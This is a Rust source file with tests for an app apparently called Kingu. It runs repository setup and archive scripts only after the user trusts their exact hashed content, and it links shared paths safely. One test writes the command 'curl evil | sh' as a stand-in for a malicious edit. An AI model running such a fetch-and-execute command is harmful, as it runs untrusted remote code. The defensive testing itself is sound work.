//! The repository's worktree scripts (Orca's setup / archive scripts, default tabs and issue
//! command) and the user's own per-repository ones.
//!
//! Shared (from the repository): `kingu.yaml` (`scripts.setup`, `scripts.archive`,
//! `defaultTabs[].command`, `issueCommand`), and for setup / archive the older `.kingu/setup.sh`
//! / `.kingu/archive.sh` when kingu.yaml has none. They come with the repository, so like a repo
//! snap they only run once the user trusted exactly this content (the snap trust store, by hash,
//! per folder and kind). The trusted bytes are copied to the app cache under their hash and that
//! copy is what runs, so an edit after the check never runs untrusted.
//!
//! Local (the user's, no trust needed): `kingu.repo.setupScript`, `kingu.repo.archiveScript` and
//! `kingu.repo.issueCommand`, read here from Kingu's per-repository store or the user's
//! settings.json, never from the webview or the repository. `kingu.repo.scriptSource` (Orca's
//! command source policy) picks which of the two run.

use crate::i18n::msg::AgentMsg;
use crate::tr;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::{Duration, Instant};

use tauri::{AppHandle, Manager, State};

use super::kingu_yaml::{self, KinguYaml};
use crate::settings::kingu_file;
use crate::snap::{TRUST_FILE, TrustData, set_script_trust, sha256_hex};
use crate::workspace::Workspace;

const MAX_BYTES: u64 = 64 * 1024;
const CACHE_DIR: &str = "worktree-scripts";
/// How long the archive script may run before it is killed (removal then asks what to do).
pub const ARCHIVE_TIMEOUT: Duration = Duration::from_secs(120);
const MAX_OUTPUT: usize = 4096;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
  Setup,
  Archive,
  /// kingu.yaml `defaultTabs` commands (one trust for all of them).
  Tabs,
  /// kingu.yaml `issueCommand`, or `kingu.repo.issueCommand`.
  Issue,
}

impl Kind {
  pub fn parse(s: &str) -> Result<Self, String> {
    match s {
      "setup" => Ok(Self::Setup),
      "archive" => Ok(Self::Archive),
      "tabs" => Ok(Self::Tabs),
      "issue" => Ok(Self::Issue),
      _ => Err(format!("unknown worktree script {s}")),
    }
  }

  /// `.kingu/<file>`: the older per-repository script file, for setup and archive.
  fn legacy_file(self) -> Option<&'static str> {
    match self {
      Self::Setup => Some("setup.sh"),
      Self::Archive => Some("archive.sh"),
      Self::Tabs | Self::Issue => None,
    }
  }

  /// The trust store key: starts with `.`, so no snap id can take it.
  fn trust_key(self) -> &'static str {
    match self {
      Self::Setup => ".worktree-setup",
      Self::Archive => ".worktree-archive",
      Self::Tabs => ".worktree-tabs",
      Self::Issue => ".worktree-issue",
    }
  }

  /// The user's own command for this kind (a `local` setting).
  fn local_key(self) -> Option<&'static str> {
    match self {
      Self::Setup => Some("kingu.repo.setupScript"),
      Self::Archive => Some("kingu.repo.archiveScript"),
      Self::Issue => Some("kingu.repo.issueCommand"),
      Self::Tabs => None,
    }
  }
}

/// `kingu.repo.scriptSource` (Orca's HookCommandSourcePolicy plus its implicit default).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Source {
  /// The local script when there is one, else the shared one.
  Auto,
  SharedOnly,
  /// No kingu.yaml command runs at all (default tabs and issue command included).
  LocalOnly,
  RunBoth,
}

impl Source {
  pub fn parse(s: Option<&str>) -> Self {
    match s {
      Some("shared-only") => Self::SharedOnly,
      Some("local-only") => Self::LocalOnly,
      Some("run-both") => Self::RunBoth,
      _ => Self::Auto,
    }
  }
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct WorktreeScript {
  /// Where it comes from: `kingu.yaml scripts.setup`, `.kingu/setup.sh`, …
  pub path: String,
  pub content: String,
  pub hash: String,
  pub trusted: bool,
}

/// What runs for one kind: the repository's (trusted or not) and / or the user's own.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct ScriptPlan {
  pub shared: Option<WorktreeScript>,
  pub local: Option<String>,
}

/// A `.kingu/<name>` file's text, or `None` when the folder has none.
fn read_legacy(root: &Path, name: &str) -> Result<Option<String>, String> {
  let file = kingu_file(root, name)?;
  let meta = match std::fs::metadata(&file) {
    Ok(m) => m,
    Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
    Err(e) => return Err(format!("{}: {e}", file.display())),
  };
  if meta.len() > MAX_BYTES {
    return Err(tr!(AgentMsg::ScriptTooLarge, name, kb = MAX_BYTES / 1024));
  }
  let bytes = std::fs::read(&file).map_err(|e| format!("{}: {e}", file.display()))?;
  String::from_utf8(bytes).map(Some).map_err(|_| tr!(AgentMsg::ScriptNotUtf8, name))
}

/// The default tabs' commands as one text the user reviews and trusts together.
pub fn tabs_text(config: &KinguYaml) -> Option<String> {
  let lines: Vec<String> = config
    .default_tabs
    .iter()
    .filter_map(|t| t.command.as_ref().map(|c| format!("# {}\n{c}", t.title.as_deref().unwrap_or("Terminal"))))
    .collect();
  (!lines.is_empty()).then(|| lines.join("\n\n") + "\n")
}

/// The repository's text for `kind` (where it comes from, content), or `None`. A kingu.yaml that
/// does not parse counts as absent here (the Repository page and task creation report it).
pub fn shared_text(root: &Path, kind: Kind) -> Result<Option<(String, String)>, String> {
  let config = kingu_yaml::load(root).unwrap_or_else(|e| {
    log::warn!("{e}");
    None
  });
  let from_yaml = config.as_ref().and_then(|c| match kind {
    Kind::Setup => c.scripts.setup.clone().map(|s| ("kingu.yaml scripts.setup", s)),
    Kind::Archive => c.scripts.archive.clone().map(|s| ("kingu.yaml scripts.archive", s)),
    Kind::Tabs => tabs_text(c).map(|s| ("kingu.yaml defaultTabs", s)),
    Kind::Issue => c.issue_command.clone().map(|s| ("kingu.yaml issueCommand", s)),
  });
  if let Some((path, mut text)) = from_yaml {
    if matches!(kind, Kind::Setup | Kind::Archive) && !text.ends_with('\n') {
      text.push('\n');
    }
    return Ok(Some((path.to_owned(), text)));
  }
  match kind.legacy_file() {
    Some(name) => Ok(read_legacy(root, name)?.map(|t| (format!(".kingu/{name}"), t))),
    None => Ok(None),
  }
}

pub fn inspect_shared(root: &Path, kind: Kind, trust: &TrustData) -> Result<Option<WorktreeScript>, String> {
  Ok(shared_text(root, kind)?.map(|(path, content)| {
    let hash = sha256_hex(content.as_bytes());
    let trusted = trust.is_trusted(root, kind.trust_key(), &hash);
    WorktreeScript { path, content, hash, trusted }
  }))
}

/// One `local` setting: Kingu's per-repository store first, then the user's settings.json.
fn local_value(config_dir: &Path, root: &Path, key: &str) -> Option<serde_json::Value> {
  crate::settings::repo_value(config_dir, root, key).or_else(|| crate::settings::user_value(config_dir, key))
}

fn local_text(config_dir: &Path, root: &Path, key: &str) -> Option<String> {
  local_value(config_dir, root, key).and_then(|v| v.as_str().map(str::to_owned)).filter(|s| !s.trim().is_empty() && s.len() as u64 <= MAX_BYTES)
}

/// What runs for `kind` in the folder `root` under the user's settings in `config_dir`.
pub fn plan(config_dir: &Path, root: &Path, kind: Kind, trust: &TrustData) -> Result<Option<ScriptPlan>, String> {
  let source = Source::parse(local_value(config_dir, root, "kingu.repo.scriptSource").as_ref().and_then(|v| v.as_str()));
  let local = kind.local_key().and_then(|k| local_text(config_dir, root, k)).map(|mut s| {
    if !s.ends_with('\n') && kind != Kind::Issue {
      s.push('\n');
    }
    s
  });
  let shared = if source == Source::LocalOnly { None } else { inspect_shared(root, kind, trust)? };
  let (shared, local) = match kind {
    // The user's issue command replaces the repository's (Orca's custom command override).
    Kind::Issue => match local {
      Some(l) => (None, Some(l)),
      None => (shared, None),
    },
    Kind::Tabs => (shared, None),
    Kind::Setup | Kind::Archive => match source {
      Source::Auto if local.is_some() => (None, local),
      Source::Auto | Source::SharedOnly => (shared, None),
      Source::LocalOnly => (None, local),
      Source::RunBoth => (shared, local),
    },
  };
  Ok((shared.is_some() || local.is_some()).then_some(ScriptPlan { shared, local }))
}

/// Trusts the shared text the user was shown (`expected`); refuses when it changed since.
pub fn trust(config_dir: &Path, root: &Path, kind: Kind, expected: &str) -> Result<(), String> {
  let (path, content) = shared_text(root, kind)?.ok_or_else(|| tr!(AgentMsg::NoRepoScript, kind = format!("{kind:?}")))?;
  if sha256_hex(content.as_bytes()) != expected {
    return Err(tr!(AgentMsg::ScriptChanged, path));
  }
  set_script_trust(config_dir, root, kind.trust_key(), Some(expected))
}

pub fn untrust(config_dir: &Path, root: &Path, kind: Kind) -> Result<(), String> {
  set_script_trust(config_dir, root, kind.trust_key(), None)
}

fn cached(dir: &Path, content: &str) -> Result<PathBuf, String> {
  let hash = sha256_hex(content.as_bytes());
  let file = dir.join(format!("{hash}.sh"));
  if std::fs::read(&file).ok().is_none_or(|b| sha256_hex(&b) != hash) {
    crate::settings::write_atomic(&file, content)?;
  }
  Ok(file)
}

/// Runs two scripts one after the other; the first failure's status is the result.
fn both_runner(first: &Path, second: &Path) -> String {
  let q = |p: &Path| format!("'{}'", p.display().to_string().replace('\'', r"'\''"));
  format!("sh {} ; a=$?\nsh {} ; b=$?\nif [ \"$a\" -ne 0 ]; then exit \"$a\"; fi\nexit \"$b\"\n", q(first), q(second))
}

/// The plan for `kind` (setup or archive) as one runnable file in `<cache>/worktree-scripts/`;
/// `None` when nothing runs. An untrusted (or changed) shared script is an error and nothing is
/// written for it.
pub fn prepare(config_dir: &Path, trust: &TrustData, cache_dir: &Path, root: &Path, kind: Kind) -> Result<Option<PathBuf>, String> {
  if !matches!(kind, Kind::Setup | Kind::Archive) {
    return Err("only setup and archive scripts are prepared as files".into());
  }
  let Some(plan) = plan(config_dir, root, kind, trust)? else {
    return Ok(None);
  };
  if let Some(s) = &plan.shared
    && !s.trusted
  {
    return Err(tr!(AgentMsg::ScriptNotTrusted, path = s.path));
  }
  let dir = cache_dir.join(CACHE_DIR);
  std::fs::create_dir_all(&dir).map_err(|e| format!("{}: {e}", dir.display()))?;
  let shared = plan.shared.map(|s| cached(&dir, &s.content)).transpose()?;
  let local = plan.local.map(|l| cached(&dir, &l)).transpose()?;
  match (shared, local) {
    (Some(a), Some(b)) => cached(&dir, &both_runner(&a, &b)).map(Some),
    (a, b) => Ok(a.or(b)),
  }
}

/// `KINGU_ROOT_PATH`, `KINGU_WORKTREE_PATH`, `KINGU_WORKSPACE_NAME` (Orca's `ORCA_*`).
pub fn script_env(root: &Path, worktree: &Path, slug: &str) -> [(&'static str, String); 3] {
  [
    ("KINGU_ROOT_PATH", root.display().to_string()),
    ("KINGU_WORKTREE_PATH", worktree.display().to_string()),
    ("KINGU_WORKSPACE_NAME", slug.to_owned()),
  ]
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct ScriptRun {
  /// Exit code; `None` when killed (timeout) or ended by a signal.
  pub code: Option<i32>,
  pub timed_out: bool,
  /// The end of stdout + stderr.
  pub output: String,
}

/// Runs `sh <file>` in `worktree` with the script env, killing it after `timeout`.
pub fn run(file: &Path, root: &Path, worktree: &Path, slug: &str, timeout: Duration) -> Result<ScriptRun, String> {
  let mut cmd = crate::shell_env::command("sh");
  cmd.arg(file).current_dir(worktree).stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::piped());
  cmd.envs(script_env(root, worktree, slug));
  // Its own process group, so a timeout kills what the script started too (they hold the pipes).
  #[cfg(unix)]
  {
    use std::os::unix::process::CommandExt;
    cmd.process_group(0);
  }
  let mut child = cmd.spawn().map_err(|e| format!("sh: {e}"))?;
  let (mut out, mut err) = (child.stdout.take().ok_or("no stdout")?, child.stderr.take().ok_or("no stderr")?);
  let out_reader = std::thread::spawn(move || {
    let mut b = Vec::new();
    let _ = out.read_to_end(&mut b);
    b
  });
  let err_reader = std::thread::spawn(move || {
    let mut b = Vec::new();
    let _ = err.read_to_end(&mut b);
    b
  });
  let start = Instant::now();
  let (code, timed_out) = loop {
    if let Some(status) = child.try_wait().map_err(|e| e.to_string())? {
      break (status.code(), false);
    }
    if start.elapsed() >= timeout {
      #[cfg(unix)]
      // SAFETY: plain syscall on the group created for this child above.
      unsafe {
        libc::kill(-(child.id() as i32), libc::SIGKILL);
      }
      let _ = child.kill();
      let _ = child.wait();
      break (None, true);
    }
    std::thread::sleep(Duration::from_millis(50));
  };
  let mut bytes = out_reader.join().unwrap_or_default();
  bytes.extend(err_reader.join().unwrap_or_default());
  let text = String::from_utf8_lossy(&bytes);
  let output = match text.char_indices().rev().nth(MAX_OUTPUT) {
    Some((i, _)) => format!("…{}", &text[i..]),
    None => text.into_owned(),
  };
  Ok(ScriptRun { code, timed_out, output })
}

// ---------------------------------------------------------------------------------------------
// Shared directories (kingu.yaml worktree.sharedDirectories, kingu.repo.symlinkPaths)

/// `kingu.repo.symlinkPaths`, kept to safe repo-relative paths.
fn symlink_paths(config_dir: &Path, root: &Path) -> Vec<String> {
  local_value(config_dir, root, "kingu.repo.symlinkPaths")
    .and_then(|v| v.as_array().cloned())
    .unwrap_or_default()
    .iter()
    .filter_map(|v| v.as_str().and_then(kingu_yaml::normalize_relative))
    .collect()
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Link {
  /// A symlink to the primary checkout's path (folders, and files where cloning is not possible).
  Symlink,
  /// An APFS copy-on-write clone (macOS files from kingu.repo.symlinkPaths).
  Clone,
}

#[cfg(target_os = "macos")]
fn clone_file(src: &Path, dst: &Path) -> bool {
  use std::os::unix::ffi::OsStrExt;
  let (Ok(s), Ok(d)) = (std::ffi::CString::new(src.as_os_str().as_bytes()), std::ffi::CString::new(dst.as_os_str().as_bytes())) else {
    return false;
  };
  // SAFETY: both are valid NUL-terminated paths for the duration of the call.
  unsafe { libc::clonefile(s.as_ptr(), d.as_ptr(), 0) == 0 }
}

#[cfg(not(target_os = "macos"))]
fn clone_file(_src: &Path, _dst: &Path) -> bool {
  false
}

/// Links each path of the primary checkout `root` into the new worktree: Orca's sharedDirectories
/// (symlinked) and symlinkPaths (files cloned on macOS when possible, else symlinked). A path that
/// is missing in `root`, resolves outside it, or already exists in the worktree is skipped.
pub fn link_paths(root: &Path, worktree: &Path, shared: &[String], symlinks: &[String]) -> Vec<(String, Link)> {
  let Ok(real_root) = root.canonicalize() else { return vec![] };
  let mut done = Vec::new();
  let entries = shared.iter().map(|p| (p, false)).chain(symlinks.iter().map(|p| (p, true)));
  for (rel, may_clone) in entries {
    if done.iter().any(|(d, _): &(String, Link)| d == rel) {
      continue;
    }
    let (src, dst) = (root.join(rel), worktree.join(rel));
    let Ok(real) = src.canonicalize() else { continue };
    if !real.starts_with(&real_root) || std::fs::symlink_metadata(&dst).is_ok() {
      continue;
    }
    if let Some(parent) = dst.parent()
      && std::fs::create_dir_all(parent).is_err()
    {
      continue;
    }
    if may_clone && real.is_file() && clone_file(&real, &dst) {
      done.push((rel.clone(), Link::Clone));
      continue;
    }
    #[cfg(unix)]
    if std::os::unix::fs::symlink(&real, &dst).is_ok() {
      done.push((rel.clone(), Link::Symlink));
    }
  }
  done
}

// ---------------------------------------------------------------------------------------------
// Commands

fn trust_data(app: &AppHandle) -> Result<TrustData, String> {
  Ok(TrustData::load(&crate::snap::config_dir(app)?.join(TRUST_FILE)))
}

fn cache_dir(app: &AppHandle) -> Result<PathBuf, String> {
  app.path().app_cache_dir().map_err(|e| e.to_string())
}

/// What runs for `kind` in the open folder (`None`: nothing).
#[tauri::command]
pub fn worktree_script(app: AppHandle, ws: State<'_, Workspace>, kind: String) -> Result<Option<ScriptPlan>, String> {
  let kind = Kind::parse(&kind)?;
  let Some(root) = ws.current() else {
    return Ok(None);
  };
  plan(&crate::snap::config_dir(&app)?, &root, kind, &trust_data(&app)?)
}

/// `trusted`: trust the shared text with hash `hash` (what the user was shown), or revoke trust.
#[tauri::command]
pub fn worktree_script_trust(app: AppHandle, ws: State<'_, Workspace>, kind: String, trusted: bool, hash: Option<String>) -> Result<(), String> {
  let kind = Kind::parse(&kind)?;
  let root = ws.root()?;
  let config = crate::snap::config_dir(&app)?;
  if trusted {
    trust(&config, &root, kind, hash.as_deref().ok_or_else(|| tr!(AgentMsg::ScriptHashRequired))?)?;
  } else {
    untrust(&config, &root, kind)?;
  }
  log::info!("worktree {kind:?} script: trusted = {trusted} in {}", root.display());
  Ok(())
}

/// The runnable setup / archive file (absolute path), for the setup terminal.
#[tauri::command]
pub fn worktree_script_prepare(app: AppHandle, ws: State<'_, Workspace>, kind: String) -> Result<Option<String>, String> {
  let kind = Kind::parse(&kind)?;
  let file = prepare(&crate::snap::config_dir(&app)?, &trust_data(&app)?, &cache_dir(&app)?, &ws.root()?, kind)?;
  Ok(file.map(|f| f.display().to_string()))
}

/// Runs the archive plan in the task worktree before it is removed; `None` when nothing runs.
#[tauri::command]
pub async fn worktree_archive_run(app: AppHandle, ws: State<'_, Workspace>, slug: String) -> Result<Option<ScriptRun>, String> {
  let root = ws.root()?;
  let dir = super::review::task_dir(&root, &slug)?;
  let Some(file) = prepare(&crate::snap::config_dir(&app)?, &trust_data(&app)?, &cache_dir(&app)?, &root, Kind::Archive)? else {
    return Ok(None);
  };
  let r = tauri::async_runtime::spawn_blocking(move || run(&file, &root, &dir, &slug, ARCHIVE_TIMEOUT)).await.map_err(|e| e.to_string())??;
  log::info!("worktree archive script: exit {:?} (timed out: {})", r.code, r.timed_out);
  Ok(Some(r))
}

/// A fresh file the setup terminal writes its exit status to (`kingu.worktree.setupAgentStartup`
/// = wait-for-setup); any old one is removed.
#[tauri::command]
pub fn worktree_setup_marker(app: AppHandle, slug: String) -> Result<String, String> {
  super::worktree::validate_slug(&slug)?;
  let dir = cache_dir(&app)?.join(CACHE_DIR).join("done");
  std::fs::create_dir_all(&dir).map_err(|e| format!("{}: {e}", dir.display()))?;
  let file = dir.join(format!("{slug}-{}", std::process::id()));
  let _ = std::fs::remove_file(&file);
  Ok(file.display().to_string())
}

/// The setup's exit status once its terminal wrote it to `marker`, else `None`.
#[tauri::command]
pub fn worktree_setup_status(app: AppHandle, marker: String) -> Result<Option<i32>, String> {
  let dir = cache_dir(&app)?.join(CACHE_DIR).join("done");
  let path = PathBuf::from(&marker);
  if path.parent() != Some(dir.as_path()) {
    return Err("not a setup marker".into());
  }
  Ok(std::fs::read_to_string(&path).ok().and_then(|t| t.trim().parse().ok()))
}

/// Links kingu.yaml `worktree.sharedDirectories` and `kingu.repo.symlinkPaths` into the new task
/// worktree; returns the linked paths.
#[tauri::command]
pub fn worktree_link_shared(app: AppHandle, ws: State<'_, Workspace>, slug: String) -> Result<Vec<String>, String> {
  let root = ws.root()?;
  let dir = super::review::task_dir(&root, &slug)?;
  let config = crate::snap::config_dir(&app)?;
  let source = Source::parse(local_value(&config, &root, "kingu.repo.scriptSource").as_ref().and_then(|v| v.as_str()));
  let shared = if source == Source::LocalOnly { vec![] } else { kingu_yaml::load(&root).ok().flatten().map(|c| c.shared_directories).unwrap_or_default() };
  let linked = link_paths(&root, &dir, &shared, &symlink_paths(&config, &root));
  log::info!("worktree {slug}: linked {} shared path(s)", linked.len());
  Ok(linked.into_iter().map(|(p, _)| p).collect())
}

#[cfg(test)]
mod tests {
  use super::*;

  fn setup() -> (tempfile::TempDir, PathBuf, PathBuf, PathBuf) {
    let tmp = tempfile::tempdir().unwrap();
    let base = tmp.path().canonicalize().unwrap();
    let (root, config, cache) = (base.join("repo"), base.join("config"), base.join("cache"));
    std::fs::create_dir_all(root.join(".kingu")).unwrap();
    std::fs::create_dir_all(&config).unwrap();
    (tmp, root, config, cache)
  }

  fn load(config: &Path) -> TrustData {
    TrustData::load(&config.join(TRUST_FILE))
  }

  fn set_local(config: &Path, root: &Path, json: &str) {
    crate::settings::write_atomic(&crate::settings::repo_path(config, root), json).unwrap();
  }

  fn shared_of(config: &Path, root: &Path, kind: Kind) -> Option<WorktreeScript> {
    plan(config, root, kind, &load(config)).unwrap().and_then(|p| p.shared)
  }

  #[test]
  fn no_script_is_nothing_to_run() {
    let (_tmp, root, config, cache) = setup();
    assert_eq!(plan(&config, &root, Kind::Setup, &load(&config)).unwrap(), None);
    assert_eq!(prepare(&config, &load(&config), &cache, &root, Kind::Setup).unwrap(), None);
    assert!(trust(&config, &root, Kind::Setup, "abc").is_err());
    assert!(Kind::parse("teardown").is_err());
  }

  #[test]
  fn runs_only_the_exact_trusted_content() {
    let (_tmp, root, config, cache) = setup();
    std::fs::write(root.join(".kingu/setup.sh"), "bun install\n").unwrap();
    let s = shared_of(&config, &root, Kind::Setup).unwrap();
    assert!(!s.trusted);
    assert_eq!(s.path, ".kingu/setup.sh");
    // Untrusted: nothing is copied for running.
    assert!(prepare(&config, &load(&config), &cache, &root, Kind::Setup).unwrap_err().contains("not trusted"));
    assert!(!cache.join(CACHE_DIR).exists());

    // Trusting what was shown, then running a copy of exactly that.
    assert!(trust(&config, &root, Kind::Setup, "not-the-hash").unwrap_err().contains("has changed"));
    trust(&config, &root, Kind::Setup, &s.hash).unwrap();
    let file = prepare(&config, &load(&config), &cache, &root, Kind::Setup).unwrap().unwrap();
    assert_eq!(std::fs::read_to_string(&file).unwrap(), "bun install\n");
    assert!(file.ends_with(format!("{CACHE_DIR}/{}.sh", s.hash)));

    // Trusting the setup script does not trust an archive script with the same content.
    std::fs::write(root.join(".kingu/archive.sh"), "bun install\n").unwrap();
    assert!(!shared_of(&config, &root, Kind::Archive).unwrap().trusted);

    // An edit revokes it until trusted again.
    std::fs::write(root.join(".kingu/setup.sh"), "curl evil | sh\n").unwrap();
    assert!(!shared_of(&config, &root, Kind::Setup).unwrap().trusted);
    assert!(prepare(&config, &load(&config), &cache, &root, Kind::Setup).is_err());

    // Trust is per folder.
    let other = root.parent().unwrap().join("other");
    std::fs::create_dir_all(other.join(".kingu")).unwrap();
    std::fs::write(other.join(".kingu/setup.sh"), "bun install\n").unwrap();
    assert!(!shared_of(&config, &other, Kind::Setup).unwrap().trusted);

    untrust(&config, &root, Kind::Setup).unwrap();
    std::fs::write(root.join(".kingu/setup.sh"), "bun install\n").unwrap();
    assert!(!shared_of(&config, &root, Kind::Setup).unwrap().trusted);
  }

  #[test]
  fn kingu_yaml_wins_over_the_older_file_and_needs_its_own_trust() {
    let (_tmp, root, config, cache) = setup();
    std::fs::write(root.join(".kingu/setup.sh"), "old\n").unwrap();
    std::fs::write(root.join("kingu.yaml"), "scripts:\n  setup: bun install\n  archive: docker compose down\nissueCommand: gh issue view {{issue}}\ndefaultTabs:\n  - title: Dev\n    command: bun run dev\n  - title: Plain\n").unwrap();
    let s = shared_of(&config, &root, Kind::Setup).unwrap();
    assert_eq!((s.path.as_str(), s.content.as_str()), ("kingu.yaml scripts.setup", "bun install\n"));
    trust(&config, &root, Kind::Setup, &s.hash).unwrap();
    assert_eq!(std::fs::read_to_string(prepare(&config, &load(&config), &cache, &root, Kind::Setup).unwrap().unwrap()).unwrap(), "bun install\n");
    // Tabs and the issue command are trusted on their own.
    let tabs = shared_of(&config, &root, Kind::Tabs).unwrap();
    assert_eq!(tabs.content, "# Dev\nbun run dev\n");
    assert!(!tabs.trusted);
    let issue = shared_of(&config, &root, Kind::Issue).unwrap();
    assert_eq!((issue.content.as_str(), issue.trusted), ("gh issue view {{issue}}", false));
    assert!(prepare(&config, &load(&config), &cache, &root, Kind::Tabs).is_err());
    // A kingu.yaml that does not parse is ignored: the older file is used.
    std::fs::write(root.join("kingu.yaml"), "scripts: [\n").unwrap();
    assert_eq!(shared_of(&config, &root, Kind::Setup).unwrap().path, ".kingu/setup.sh");
    assert_eq!(shared_of(&config, &root, Kind::Issue), None);
  }

  #[test]
  fn the_source_policy_picks_local_and_shared() {
    let (_tmp, root, config, cache) = setup();
    std::fs::write(root.join("kingu.yaml"), "scripts:\n  setup: shared-setup\nissueCommand: shared-issue\ndefaultTabs:\n  - command: tab\n").unwrap();
    let p = |k| plan(&config, &root, k, &load(&config)).unwrap().unwrap();
    // auto, no local: the shared one.
    assert_eq!((p(Kind::Setup).shared.is_some(), p(Kind::Setup).local), (true, None));
    // auto with a local script: only the local one (no trust needed).
    set_local(&config, &root, "{ \"kingu.repo.setupScript\": \"mine\", \"kingu.repo.issueCommand\": \"my-issue\" }");
    assert_eq!((p(Kind::Setup).shared, p(Kind::Setup).local.as_deref()), (None, Some("mine\n")));
    assert_eq!((p(Kind::Issue).shared, p(Kind::Issue).local.as_deref()), (None, Some("my-issue")));
    let local_only = prepare(&config, &load(&config), &cache, &root, Kind::Setup).unwrap().unwrap();
    assert_eq!(std::fs::read_to_string(local_only).unwrap(), "mine\n");
    // run-both: shared then local, still needs trust in the shared part.
    set_local(&config, &root, "{ \"kingu.repo.setupScript\": \"mine\", \"kingu.repo.scriptSource\": \"run-both\" }");
    let both = p(Kind::Setup);
    assert!(both.shared.is_some() && both.local.is_some());
    assert!(prepare(&config, &load(&config), &cache, &root, Kind::Setup).is_err());
    trust(&config, &root, Kind::Setup, &both.shared.unwrap().hash).unwrap();
    let runner = std::fs::read_to_string(prepare(&config, &load(&config), &cache, &root, Kind::Setup).unwrap().unwrap()).unwrap();
    assert!(runner.starts_with("sh '") && runner.contains("exit \"$b\""), "{runner}");
    // shared-only ignores the local one.
    set_local(&config, &root, "{ \"kingu.repo.setupScript\": \"mine\", \"kingu.repo.scriptSource\": \"shared-only\" }");
    assert_eq!(p(Kind::Setup).local, None);
    // local-only: no kingu.yaml command at all, tabs and issue command included.
    set_local(&config, &root, "{ \"kingu.repo.scriptSource\": \"local-only\" }");
    assert_eq!(plan(&config, &root, Kind::Setup, &load(&config)).unwrap(), None);
    assert_eq!(plan(&config, &root, Kind::Tabs, &load(&config)).unwrap(), None);
    assert_eq!(plan(&config, &root, Kind::Issue, &load(&config)).unwrap(), None);
  }

  #[cfg(unix)]
  #[test]
  fn the_run_both_runner_runs_both_and_reports_the_first_failure() {
    let (_tmp, root, _config, _cache) = setup();
    let wt = root.join(".kingu/worktrees/t");
    std::fs::create_dir_all(&wt).unwrap();
    let (a, b) = (root.join("a.sh"), root.join("b.sh"));
    std::fs::write(&a, "echo first; exit 4\n").unwrap();
    std::fs::write(&b, "echo second\n").unwrap();
    let runner = root.join("both.sh");
    std::fs::write(&runner, both_runner(&a, &b)).unwrap();
    let r = run(&runner, &root, &wt, "t", Duration::from_secs(10)).unwrap();
    assert_eq!(r.code, Some(4));
    assert!(r.output.contains("first") && r.output.contains("second"), "{}", r.output);
  }

  #[test]
  fn does_not_touch_snap_trust_and_refuses_odd_files() {
    let (_tmp, root, config, _cache) = setup();
    assert!(set_script_trust(&config, &root, "go", Some("x")).is_err());
    std::fs::write(root.join(".kingu/setup.sh"), vec![b'#'; (MAX_BYTES + 1) as usize]).unwrap();
    assert!(plan(&config, &root, Kind::Setup, &load(&config)).is_err());
    std::fs::remove_file(root.join(".kingu/setup.sh")).unwrap();
    std::fs::create_dir(root.join(".kingu/setup.sh")).unwrap();
    assert!(plan(&config, &root, Kind::Setup, &load(&config)).is_err());
  }

  #[cfg(unix)]
  #[test]
  fn refuses_a_symlinked_script() {
    let (_tmp, root, config, _cache) = setup();
    let outside = root.parent().unwrap().join("outside.sh");
    std::fs::write(&outside, "echo hi\n").unwrap();
    std::os::unix::fs::symlink(&outside, root.join(".kingu/setup.sh")).unwrap();
    assert!(plan(&config, &root, Kind::Setup, &load(&config)).is_err());
  }

  #[test]
  fn archive_run_gets_the_env_reports_failure_and_times_out() {
    let (_tmp, root, _config, _cache) = setup();
    let wt = root.join(".kingu/worktrees/t");
    std::fs::create_dir_all(&wt).unwrap();
    let ok = root.join("ok.sh");
    std::fs::write(&ok, "echo \"$KINGU_WORKSPACE_NAME $(pwd)\"\necho oops >&2\n").unwrap();
    let r = run(&ok, &root, &wt, "t", Duration::from_secs(10)).unwrap();
    assert_eq!(r.code, Some(0));
    assert!(r.output.contains(&format!("t {}", wt.display())) && r.output.contains("oops"), "{}", r.output);
    let fail = root.join("fail.sh");
    std::fs::write(&fail, "exit 3\n").unwrap();
    assert_eq!(run(&fail, &root, &wt, "t", Duration::from_secs(10)).unwrap().code, Some(3));
    let slow = root.join("slow.sh");
    std::fs::write(&slow, "sleep 5\necho done\n").unwrap();
    let started = Instant::now();
    let r = run(&slow, &root, &wt, "t", Duration::from_millis(200)).unwrap();
    assert!(r.timed_out && r.code.is_none() && !r.output.contains("done"));
    // The script's child (sleep) was killed with it, so its open pipe did not hold us.
    assert!(started.elapsed() < Duration::from_secs(3));
  }

  #[cfg(unix)]
  #[test]
  fn links_shared_paths_safely() {
    let (_tmp, root, config, _cache) = setup();
    let wt = root.join(".kingu/worktrees/t");
    std::fs::create_dir_all(&wt).unwrap();
    std::fs::create_dir_all(root.join("node_modules/x")).unwrap();
    std::fs::write(root.join(".env"), "A=1\n").unwrap();
    std::fs::write(wt.join("exists"), "mine\n").unwrap();
    std::fs::write(root.join("exists"), "theirs\n").unwrap();
    let outside = root.parent().unwrap().join("secret");
    std::fs::create_dir_all(&outside).unwrap();
    std::os::unix::fs::symlink(&outside, root.join("escape")).unwrap();
    let linked = link_paths(&root, &wt, &["node_modules".into(), "missing".into(), "escape".into()], &[".env".into(), "exists".into(), "node_modules".into()]);
    let names: Vec<&str> = linked.iter().map(|(p, _)| p.as_str()).collect();
    assert_eq!(names, ["node_modules", ".env"]);
    assert!(std::fs::symlink_metadata(wt.join("node_modules")).unwrap().file_type().is_symlink());
    assert_eq!(std::fs::read_to_string(wt.join(".env")).unwrap(), "A=1\n");
    assert_eq!(std::fs::read_to_string(wt.join("exists")).unwrap(), "mine\n");
    assert!(!wt.join("escape").exists());
    if cfg!(target_os = "macos") {
      assert_eq!(linked[1].1, Link::Clone);
      assert!(!std::fs::symlink_metadata(wt.join(".env")).unwrap().file_type().is_symlink());
    }
    // Settings: unsafe entries are dropped.
    set_local(&config, &root, "{ \"kingu.repo.symlinkPaths\": [\".env\", \"../x\", \"/abs\", 3] }");
    assert_eq!(symlink_paths(&config, &root), [".env"]);
  }
}
